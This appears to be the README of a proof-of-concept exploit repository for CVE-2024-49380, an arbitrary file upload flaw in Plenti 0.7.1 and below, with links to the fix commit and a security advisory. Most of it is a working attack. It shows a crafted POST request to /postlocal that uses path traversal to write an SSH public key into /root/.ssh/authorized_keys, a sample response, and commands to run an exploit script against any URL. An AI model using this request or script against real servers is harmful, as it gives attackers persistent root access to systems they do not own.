## CVE-2024-49380
### Description
Plenti 0.7.1 and below allows remote users can upload arbitrary files to the server via a crafted POST request to the /postlocal URI. It can give an attacker the ability to execute arbitrary code on the server.

There is no single exploit for this vulnerability. The attacker can upload a file to the server and execute arbitrary code via different ways. It's completly related to target system. The below exploit saample is just an example. We are uploading ssh key to the server and connecting to the server via ssh.

### How to Reproduce
#### Request

```
    POST /postlocal HTTP/1.1
    Host: localhost:3000
    User-Agent: python-requests/2.32.3
    Accept-Encoding: gzip, deflate, br
    Accept: */*
    Connection: keep-alive
    Content-Length: 512
    Content-Type: application/json
    
    [{"action": "create", "encoding": "text", "file": "../../../../../root/.ssh/authorized_keys", "contents": "ssh-rsa AAAAB3NzaC1y...."}]
```

#### Response
```
    HTTP/1.1 200 OK
    Content-Length: 15
    Date: Tue, 01 Mar 2023 00:00:00 GMT
```

### How to Exploit
```
    python3 -m venv venv && source venv/bin/activate
    pip install -r requirements.txt
    python3 exploit.py https://<url> <proxy>(optional)
```

### Reference
- [Fix Commit](https://github.com/plentico/plenti/commit/081edfd776bb6f50da302e55f9b1d44da29f69f1)
- [GHSL-2024-297_GHSL-2024-298_plenti](https://securitylab.github.com/advisories/GHSL-2024-297_GHSL-2024-298_plenti/)
